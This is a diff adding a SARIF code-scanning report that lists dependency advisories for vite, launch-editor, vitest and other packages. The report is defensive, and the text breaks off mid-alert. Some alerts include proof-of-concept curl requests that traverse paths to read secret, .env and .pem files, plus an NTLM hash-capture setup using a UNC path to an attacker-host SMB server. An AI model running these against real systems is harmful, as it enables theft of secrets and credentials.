@@ -1,0 +1,1033 @@
+{
+    "runs": [
+        {
+            "artifacts": [{ "location": { "index": 0, "uri": "bom.json" } }],
+            "automationDetails": { "id": "dependency-track-yarn4/" },
+            "conversion": { "tool": { "driver": { "name": "GitHub Code Scanning" } } },
+            "results": [
+                {
+                    "correlationGuid": "9e5dec58-5f74-4cfd-9c40-a461fd5a1c11",
+                    "level": "note",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-jqfw-vq24-v9c3 in vite@4.5.14: Any HTML files on the machine were served regardless of the server.fs settings.\nseverity: low\naffected_components: vite@4.5.14\naffected_component_paths: \naffected_names: vite\naffected_versions: 4.5.14\nid: GHSA-jqfw-vq24-v9c3\ndescription:\nAny HTML files on the machine were served regardless of the server.fs settings.\nOnly apps that match the following conditions are affected:\n- explicitly exposes the Vite dev server to the network (using --host or server.host config option (https://vitejs.dev/config/server-options.html#server-host))\n- appType: 'spa' (default) or appType: 'mpa' is used\nThis vulnerability also affects the preview server. The preview server allowed HTML files not under the output directory to be served.\nThe serveStaticMiddleware (https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L123) function is in charge of serving static files from the server. It returns the viteServeStaticMiddleware (https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function checks if the extension of the requested file is \".html\" (https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case htmlFallbackMiddleware (https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/htmlFallback.ts#L14), and then to indexHtmlMiddleware (https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client.\nExecute the following shell commands:\nnpm  create  vite@latest\ncd vite-project/\necho  \"secret\" \u003e /tmp/secret.html\nnpm install\nnpm run dev\nThen, in a different shell, run the following command:\ncurl  -v  --path-as-is  'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'\nThe contents of /tmp/secret.html will be returned.\nThis will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, \"secret_files/*\")]}}})'  \u003e  vite.config.js (http://vite.config.js)\nmkdir secret_files\necho \"secret txt\" \u003e secret_files/secret.txt\necho \"secret html\" \u003e secret_files/secret.html\nnpm run dev\nThen, in a different shell, run the following command:\ncurl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'\nYou will receive a 403 HTTP Response,  because everything in the secret_files directory is denied.\nNow in the same shell run the following command:\ncurl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'\nYou will receive the contents of secret_files/secret.html.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 262,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/262"
+                    },
+                    "rule": { "id": "yarn4::GHSA-jqfw-vq24-v9c3", "index": 13 },
+                    "ruleId": "yarn4::GHSA-jqfw-vq24-v9c3"
+                },
+                {
+                    "correlationGuid": "cb2b18cd-e979-4c6e-8626-d629cd25a097",
+                    "level": "note",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-g4jq-h2w9-997c in vite@4.5.14: Files starting with the same name with the public directory were served bypassing the server.fs settings.\nseverity: low\naffected_components: vite@4.5.14\naffected_component_paths: \naffected_names: vite\naffected_versions: 4.5.14\nid: GHSA-g4jq-h2w9-997c\ndescription:\nFiles starting with the same name with the public directory were served bypassing the server.fs settings.\nOnly apps that match the following conditions are affected:\n- explicitly exposes the Vite dev server to the network (using --host or server.host config option (https://vitejs.dev/config/server-options.html#server-host))\n- uses the public directory feature (https://vite.dev/guide/assets.html#the-public-directory) (enabled by default)\n- a symlink exists in the public directory\nThe servePublicMiddleware (https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L79) function is in charge of serving public files from the server. It returns the viteServePublicMiddleware (https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L106) function which runs the needed tests and serves the page. The viteServePublicMiddleware function checks if the publicFiles variable is defined (https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. publicFiles may be undefined if there is a symbolic link anywhere inside the public directory (https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the sirv (https://github.com/lukeed/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware disables this functionality (https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list.\nIn the case of public pages, the serving function is provided with the path to the public directory (https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L85) as a root directory. The code of the sirv library uses the join function to get the full path to the requested file (https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L42). For example, if the public directory is \"/www/public\", and the requested file is \"myfile\", the code will join them to the string \"/www/public/myfile\". The code will then pass this string to the normalize function. Afterwards, the code will use the string's startsWith function (https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served.\nSince sirv trims the trailing slash of the public directory (https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at \"/www\", and the public directory is at \"/www/p\", if the created path will be \"/www/private.txt\", the startsWith function will still return true, because the string \"/www/private.txt\" starts with  \"/www/p\". To achieve this, the attacker will use \"..\" to ask for the file \"../private.txt\". The code will then join it to the \"/www/p\" string, and will receive \"/www/p/../private.t"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 263,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/263"
+                    },
+                    "rule": { "id": "yarn4::GHSA-g4jq-h2w9-997c", "index": 9 },
+                    "ruleId": "yarn4::GHSA-g4jq-h2w9-997c"
+                },
+                {
+                    "correlationGuid": "ed6f2985-0ae4-4f35-969d-db8733972155",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-93m4-6634-74q7 in vite@4.5.14: Files denied by server.fs.deny (https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with \\ when the dev server is running on Windows.\nseverity: medium\naffected_components: vite@4.5.14\naffected_component_paths: \naffected_names: vite\naffected_versions: 4.5.14\nid: GHSA-93m4-6634-74q7\ndescription:\nFiles denied by server.fs.deny (https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with \\ when the dev server is running on Windows.\nOnly apps that match the following conditions are affected:\n- explicitly exposes the Vite dev server to the network (using --host or server.host config option (https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\nserver.fs.deny can contain patterns matching against files (by default it includes .env, .env.*, *.{crt,pem} as such patterns). These patterns were able to bypass by using a back slash(\\). The root cause is that fs.readFile('/foo.png/') loads /foo.png.\nshell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" \u003e .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n\u003cimg width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" /\u003e\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 264,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/264"
+                    },
+                    "rule": { "id": "yarn4::GHSA-93m4-6634-74q7", "index": 6 },
+                    "ruleId": "yarn4::GHSA-93m4-6634-74q7"
+                },
+                {
+                    "correlationGuid": "8298e2fe-febc-4dd0-9e38-53521d3ba2b2",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-4w7w-66w2-5vf9 in vite@4.5.14: Any files ending with .map even out side the project can be returned to the browser.\nseverity: medium\naffected_components: vite@4.5.14\naffected_component_paths: \naffected_names: vite\naffected_versions: 4.5.14\nid: GHSA-4w7w-66w2-5vf9\ndescription:\nAny files ending with .map even out side the project can be returned to the browser.\nOnly apps that match the following conditions are affected:\n- explicitly exposes the Vite dev server to the network (using --host or server.host config option (https://vitejs.dev/config/server-options.html#server-host))\n- have a sensitive content in files ending with .map and the path is predictable\nIn Vite v7.3.1, the dev server’s handling of .map requests for optimized dependencies resolves file paths and calls readFile without restricting ../ segments in the URL. As a result, it is possible to bypass the server.fs.strict (https://vite.dev/config/server-options#server-fs-strict) allow list and retrieve .map files located outside the project root, provided they can be parsed as valid source map JSON.\n1. Create a minimal PoC sourcemap outside the project root\nbash\ncat \u003e /tmp/poc.map \u003c\u003c'EOF'\n{\"version\":3,\"file\":\"x.js\",\"sources\":[],\"names\":[],\"mappings\":\"\"}\nEOF\n2. Start the Vite dev server (example)\nbash\npnpm -C playground/fs-serve dev --host 127.0.0.1 --port 18080\n3. Confirm that direct /@fs access is blocked by strict (returns 403)\n\u003cimg width=\"4004\" height=\"1038\" alt=\"image\" src=\"https://github.com/user-attachments/assets/15a859a8-1dc6-4105-8d58-80527c0dd9ab\" /\u003e\n4. Inject ../ segments under the optimized deps .map URL prefix to reach /tmp/poc.map\n\u003cimg width=\"2790\" height=\"846\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5d02957d-2e6a-4c45-9819-3f024e0e81f2\" /\u003e\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 265,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/265"
+                    },
+                    "rule": { "id": "yarn4::GHSA-4w7w-66w2-5vf9", "index": 1 },
+                    "ruleId": "yarn4::GHSA-4w7w-66w2-5vf9"
+                },
+                {
+                    "correlationGuid": "7787c60b-3f55-4a6d-80ad-a8ddccf5b0fa",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-c27g-q93r-2cwf in vite@4.5.14: Due to the insufficient sanitization of the file argument in the launchEditor, an attacker can execute arbitrary commands on Windows by supplying a filename that contains special c...\nseverity: high\naffected_components: vite@4.5.14\naffected_component_paths: \naffected_names: vite\naffected_versions: 4.5.14\nid: GHSA-c27g-q93r-2cwf\ndescription:\nDue to the insufficient sanitization of the file argument in the launchEditor, an attacker can execute arbitrary commands on Windows by supplying a filename that contains special characters.\nIf the following conditions are met, an attacker can execute arbitrary commands on the computer that is using the launch-editor:\n- An attacker can place a file with the malicious filename\n- An attacker can call the launchEditor method with the file argument controlled\n- The launch-editor package is running on Windows\nFor example, some development server using this package satisfy these conditions, as a malicious website might be able to force the downloading of a file and the path of that file is predictable.\nPatch\nThis issue has been fixed in the launch-editor version 2.9.0 (commit (https://github.com/vitejs/launch-editor/commit/971291e8a6a91226e1616c5c0ec85423d2d50a5e)).\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 535,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/535"
+                    },
+                    "rule": { "id": "yarn4::GHSA-c27g-q93r-2cwf", "index": 7 },
+                    "ruleId": "yarn4::GHSA-c27g-q93r-2cwf"
+                },
+                {
+                    "correlationGuid": "4cd1ad1d-a990-42cc-b5c5-cbdec887118a",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-fx2h-pf6j-xcff in vite@4.5.14: The contents of files that are specified by server.fs.deny (https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser on Windows.\nseverity: high\naffected_components: vite@4.5.14\naffected_component_paths: \naffected_names: vite\naffected_versions: 4.5.14\nid: GHSA-fx2h-pf6j-xcff\ndescription:\nThe contents of files that are specified by server.fs.deny (https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser on Windows.\nOnly apps that match the following conditions are affected:\n- explicitly exposes the Vite dev server to the network (using --host or server.host config option (https://vitejs.dev/config/server-options.html#server-host))\n- the sensitive file exists in the allowed directories specified by server.fs.allow (https://vite.dev/config/server-options#server-fs-allow)\n- either of:\n- the sensitive file exists in an NTFS volume\n- the dev server is running on Windows and the sensitive file exists in a volume that 8.3 short name generation is enabled (it is enabled by default on system volumes)\nVite’s dev server denies direct access to sensitive files through server.fs.deny, including entries such as .env, .env.*, and *.{crt,pem}. However, on Windows, the deny logic does not correctly normalize NTFS ADS path forms before access checks are applied.\nBecause of this, requests such as /.env::$DATA?raw are treated as allowed paths, while Windows resolves them to the original file's default data stream.\nSimilar to that, Windows allows accessing a file using a different name with the 8.3 short name compatibility feature. Vite did not reject accessing files via them.\nbash\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\nAccess via browser at http://localhost:5173/.env::$DATA?raw\n\u003cimg width=\"388\" height=\"129\" alt=\"deecc1315123883cfd0f9c26a002845a\" src=\"https://github.com/user-attachments/assets/895c6012-4e2e-4a35-babb-69bbf3ee7170\" /\u003e\nExample expected result:\n- /.env::$DATA?raw returns the contents of .env\n- /tls.pem::$DATA?raw returns the contents of tls.pem\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 658,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/658"
+                    },
+                    "rule": { "id": "yarn4::GHSA-fx2h-pf6j-xcff", "index": 8 },
+                    "ruleId": "yarn4::GHSA-fx2h-pf6j-xcff"
+                },
+                {
+                    "correlationGuid": "422dd3fc-0d47-4c62-81de-fd9a0fe718ed",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-v6wh-96g9-6wx3 in vite@4.5.14: The launch-editor NPM package accesses arbitrary paths including Windows UNC paths. When a UNC path is opened, Windows automatically attempts NTLM authentication to the remote host...\nseverity: medium\naffected_components: vite@4.5.14\naffected_component_paths: \naffected_names: vite\naffected_versions: 4.5.14\nid: GHSA-v6wh-96g9-6wx3\ndescription:\nThe launch-editor NPM package accesses arbitrary paths including Windows UNC paths. When a UNC path is opened, Windows automatically attempts NTLM authentication to the remote host, causing the user’s NTLMv2 password hash to be leaked to an attacker-controlled SMB server. This can result in credential compromise through offline hash cracking.\nIf the following conditions are met, an attacker can get the NTLMv2 password hash on the computer that is using the launch-editor:\n- using Windows\n- NTLM is not disabled (it is recommended to disable (https://techcommunity.microsoft.com/blog/windows-itpro-blog/advancing-windows-security-disabling-ntlm-by-default/4489526), while it's still enabled by default)\n- the user accesses the attackers website that sends request to a middleware using launch-editor\n- the server that has the middleware using launch-editor is running\n- the attacker knows the URL for that server and the middleware\nThis would be a problem if the user password is too simple that it can be identified through offline hash cracking, potentially leading to further compromise of developer accounts or internal systems.\nlaunch-editor accepts file paths without validating or restricting Windows UNC paths such as:\n\\\\attacker-host\\share\nOn Windows systems, accessing a UNC path triggers an automatic NTLM authentication attempt to the remote SMB server. No user interaction or warning is required for this authentication attempt to occur.\nIf an attacker controls the SMB server referenced by the UNC path the victim’s NTLMv2 hash is transmitted to the attacker. The attacker can then capture the hash and perform offline password cracking. Successful cracking reveals the victim’s cleartext password.\nThe attacker could target a developer that uses a development server using launch-editor to develop code locally, send them a link and grab their NTLMv2 hash.\nFrom the attacker side, we will setup an SMB server. I personally used Impacket's smbserver.py (https://github.com/fortra/impacket/blob/master/examples/smbserver.py), but you could use something like Responder (https://github.com/lgandx/Responder) for this as well. For keeping it simple, we will use smbserver.py here.\nFirst, let's create a directory to serve as an SMB share.\nmkdir /tmp/data\necho \"Hello world\" \u003e /tmp/data/test.txt\nThen, start the SMB server.\n$ sudo smbserver.py -smb2support -debug share /tmp/data\nNow, run any project that uses the launch-editor package. I have setup a simple \"Hello world\" project that uses Vite to do this. Then run the project locally (vite).\nNow last, we will open a browser window and navigate to the URL used by the launch-editor package to trigger the NTLM authentication. Or we can use curl to achieve the same.\ncurl 'http://localhost:5173/__open-in-editor?file=%5c%5c127.0.0.1%5cshare%5ctest.txt'\nNote the IP address in the HTTP request, and make sure it connects to the IP address of the SMB server. Now we can look at the logs of smbserver.py and see the NTLMv2 hash coming in.\n\u003cimg width=\"1916\" height=\"277\" alt=\"2026-01-30_10-58\" src=\"https://github.com/user-attachments/assets/2f606e8f-c9bb-41dc-b507-ea6606b53368\" /\u003e\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 659,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/659"
+                    },
+                    "rule": { "id": "yarn4::GHSA-v6wh-96g9-6wx3", "index": 20 },
+                    "ruleId": "yarn4::GHSA-v6wh-96g9-6wx3"
+                },
+                {
+                    "correlationGuid": "61e9f5a9-4aa1-4253-b6be-6ffe756f9a68",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-p5wg-g6qr-c7cg in eslint@8.57.1: There is a Stack Overflow vulnerability in eslint before 9.26.0 when serializing objects with circular references in eslint/lib/shared/serialization.js. The exploit is triggered vi...\nseverity: medium\naffected_components: eslint@8.57.1\naffected_component_paths: \naffected_names: eslint\naffected_versions: 8.57.1\nid: GHSA-p5wg-g6qr-c7cg\ndescription:\nThere is a Stack Overflow vulnerability in eslint before 9.26.0 when serializing objects with circular references in eslint/lib/shared/serialization.js. The exploit is triggered via the RuleTester.run() method, which validates test cases and checks for duplicates. During validation, the internal function checkDuplicateTestCase() is called, which in turn uses the isSerializable() function for serialization checks. When a circular reference object is passed in, isSerializable() enters infinite recursion, ultimately causing a Stack Overflow.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 270,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/270"
+                    },
+                    "rule": { "id": "yarn4::GHSA-p5wg-g6qr-c7cg", "index": 15 },
+                    "ruleId": "yarn4::GHSA-p5wg-g6qr-c7cg"
+                },
+                {
+                    "correlationGuid": "39e6f006-82d6-4ce8-8443-6820eb878b42",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-5xrq-8626-4rwp in vitest@0.32.4: Arbitrary file can be read on Windows when Vitest UI server is listening, especially when exposed to the network.\nseverity: critical\naffected_components: vitest@0.32.4\naffected_component_paths: \naffected_names: vitest\naffected_versions: 0.32.4\nid: GHSA-5xrq-8626-4rwp\ndescription:\nArbitrary file can be read on Windows when Vitest UI server is listening, especially when exposed to the network.\nOnly users that match either of the following conditions are affected:\n- explicitly exposes the Vitest UI server to the network (using --api.host or api.host config option (https://vitest.dev/config/api.html))\n- running the Vitest UI or Browser Mode on Windows\nThe API handler for /__vitest_attachment__ uses the deprecated isFileServingAllowed incorrectly.\nhttps://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/ui/node/index.ts#L77\nThe function expects the passed value to use cleanUrl after the check before file system related operation.\nBecause of this, it is possible to bypass the check by \\\\?\\\\..\\\\. This is not possible on Linux as Linux errors if a directory named ? does not exist.\nA similar problem exists in other places as well.\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/vitest/src/api/setup.ts#L103-L105\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/vitest/src/api/setup.ts#L119-L121\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/commands/fs.ts#L10-L11\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/plugin.ts#L194-L196\n- https://github.com/vitest-dev/vitest/blob/eb1abf08573032a532015b999ad3501c5e89e3bb/packages/browser/src/node/rpc.ts#L115-L121\n**That said**, this isFileServingAllowed check does not actually prevent the API to be abused. Since the API has rerun feature and file write feature, it's possible to run arbitrary script by writing a script as a test file using saveTestFile and running it using rerun. This means exposing the API / Vitest UI is equivalent to giving script execution access.\nOn the browser mode side, there're readFile / writeFile / saveSnapshotFile. So exposing the browser mode is equivalent to giving file read / write access.\n1. Run Vitest UI\n2. Get the API token by curl http://localhost:51204/__vitest__/\n3. Run curl \"http://localhost:51204/__vitest_attachment__?path=C:\\\\path\\\\to\\\\project\\\\?\\\\..\\\\..\\\\secret.txt\u0026amp;contentType=text/plain\u0026amp;token=$TOKEN\" (TOKEN is the API token)\n4. curl shows the content of secret.txt that is outside the project directory\nMitigations\nVitest now ships two configuration flags, allowWrite (https://vitest.dev/config/api.html#api-allowwrite) and allowExec (https://vitest.dev/config/api.html#api-allowexec), that gate the privileged operations exploited by this vulnerability. Both are disabled by default whenever the API server is bound to a non-localhost host, ensuring that exposing the server to the network no longer implicitly grants write or execute capabilities to remote clients.\nWhen these flags are disabled, the UI also enters a read-only mode: in-browser code editing and test file execution are turned off, removing the attack surface that allowed remote code execution. Many Browser Mode features are also disabled, like attachments, artifacts or snapshots. See browser.api (https://vitest.dev/config/browser/api.html#api-allowwrite).\nUsers who require the full interactive UI on a networked host must explicitly opt in by setting allowWrite and/or allowExec to true.\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 378,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/378"
+                    },
+                    "rule": { "id": "yarn4::GHSA-5xrq-8626-4rwp", "index": 2 },
+                    "ruleId": "yarn4::GHSA-5xrq-8626-4rwp"
+                },
+                {
+                    "correlationGuid": "357616c7-133a-4fae-8bee-e5f434c4c8bc",
+                    "level": "warning",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-848j-6mx2-7j84 in elliptic@6.6.1: The ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of  RFC 6979 https://datatracker.ietf.org/...\nseverity: low\naffected_components: elliptic@6.6.1\naffected_component_paths: \naffected_names: elliptic\naffected_versions: 6.6.1\nid: GHSA-848j-6mx2-7j84\ndescription:\nThe ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of  RFC 6979 https://datatracker.ietf.org/doc/html/rfc6979 ) has leading zeros and is susceptible to cryptanalysis, which can lead to secret key exposure. This happens, because the byte-length of 'k' is incorrectly computed, resulting in its getting truncated during the computation. Legitimate transactions or communications will be broken as a result. Furthermore, due to the nature of the fault, attackers could–under certain conditions–derive the secret key, if they could get their hands on both a faulty signature generated by a vulnerable version of Elliptic and a correct signature for the same inputs.\nThis issue affects all known versions of Elliptic (at the time of writing, versions less than or equal to 6.6.1).\nreference_url: https://github.com/advisories"
+                    },
+                    "partialFingerprints": { "primaryLocationLineHash": "" },
+                    "properties": {
+                        "github/alertNumber": 311,
+                        "github/alertUrl": "https://api.github.com/repos/EyeSeeTea/dhis2-app-skeleton/code-scanning/alerts/311"
+                    },
+                    "rule": { "id": "yarn4::GHSA-848j-6mx2-7j84", "index": 5 },
+                    "ruleId": "yarn4::GHSA-848j-6mx2-7j84"
+                },
+                {
+                    "correlationGuid": "c163b3fd-4339-40b1-bae2-2a10bac6a446",
+                    "level": "error",
+                    "locations": [
+                        {
+                            "physicalLocation": {
+                                "artifactLocation": { "index": 0, "uri": "bom.json" },
+                                "region": { "endLine": 1, "startColumn": 1, "startLine": 1 }
+                            }
+                        }
+                    ],
+                    "message": {
+                        "text": "[yarn4] GHSA-22p9-wv53-3rq4 in linkify-it@2.2.0: LinkifyIt.prototype.match — the package's primary public API — has **O(N²) algorithmic complexity** for inputs containing many fuzzy links or emails. This is not a regex backtrack ...\nseverity: high\naffected_components: linkify-it@2.2.0\naffected_component_paths: \naffected_names: linkify-it\naffected_versions: 2.2.0\nid: GHSA-22p9-wv53-3rq4\ndescription:\nLinkifyIt.prototype.match — the package's primary public API — has **O(N²) algorithmic complexity** for inputs containing many fuzzy links or emails. This is not a regex backtrack bug; it's a structural issue in the JS-level scan loop that re-slices the input and re-runs unanchored regex searches on progressively shorter tails, N times.\n64 KB of \"a@b.com\\n\" repeated burns ~2.5 s of single-threaded CPU; 128 KB takes ~10 s. Doubling the input quadruples the time — textbook O(N²).\nThe same cost passes through markdown-it (linkify:true) unmodified. Any service that synchronously renders untrusted Markdown with linkify enabled on a request hot-path (forums, comments, chat, wikis, AI chat UIs) inherits a worker-process DoS triggerable by a tens-of-KB request body.\nAffected component\n- HEAD audited: 8e887d5bace3f5b09b1d1f70492fa0364ef1793d (v5.0.0)\n- Vulnerable function: LinkifyIt.prototype.match — index.mjs:528-554\n- Re-scan call sites inside test(): index.mjs:444 (fuzzy host search), :448 (fuzzy link match), :467 (fuzzy email match)\n- Transitive consumer: markdown-it (~21.6M weekly npm DLs) calls linkify.match() at lib/rules_core/linkify.mjs:57 when linkify:true\n- **All versions affected** — the vulnerable loop exists since the initial commit (2014) through v5.0.0\nVulnerability details\nThe O(N²) outer loop\nindex.mjs:528-554:\njs\nLinkifyIt.prototype.match = function match (text) {\nconst result = []\nlet shift = 0\nlet tail = shift ? text.slice(shift) : text\nwhile (this.test(tail)) {\nresult.push(createMatch(this, shift))\ntail = tail.slice(this.__last_index__)   // \u003c-- re-allocates remaining tail each iteration\nshift += this.__last_index__\n}\nif (result.length) return result\nreturn null\n}\nThe loop iterates O(N) times (once per match). Each iteration:\n1. tail.slice() re-allocates a string of length |text| - shift — O(N) per iteration\n2. this.test(tail) runs three unanchored regex searches over the full new tail:\njs\n// index.mjs:444 — full-tail search\ntld_pos = text.search(this.re.host_fuzzy_test)\n// index.mjs:448 — full-tail match\nml = text.match(this.re.link_fuzzy)\n// index.mjs:467 — full-tail match\nme = text.match(this.re.email_fuzzy)\nTotal cost: Σ(N - i*c) for i=0..N = O(N²).\nContrast with the linear schema branch\nThe schema-prefixed scan in the same test() function does it correctly at index.mjs:428-440:\njs\nre = this.re.schema_search\nre.lastIndex = 0\nwhile ((m = re.exec(text)) !== null) { ... }\nThat branch uses a g-flag RegExp and advances lastIndex — linear. The fuzzy branches don't follow this pattern.\nProof of concept\nbash\nmkdir /tmp/linkifyit-redos 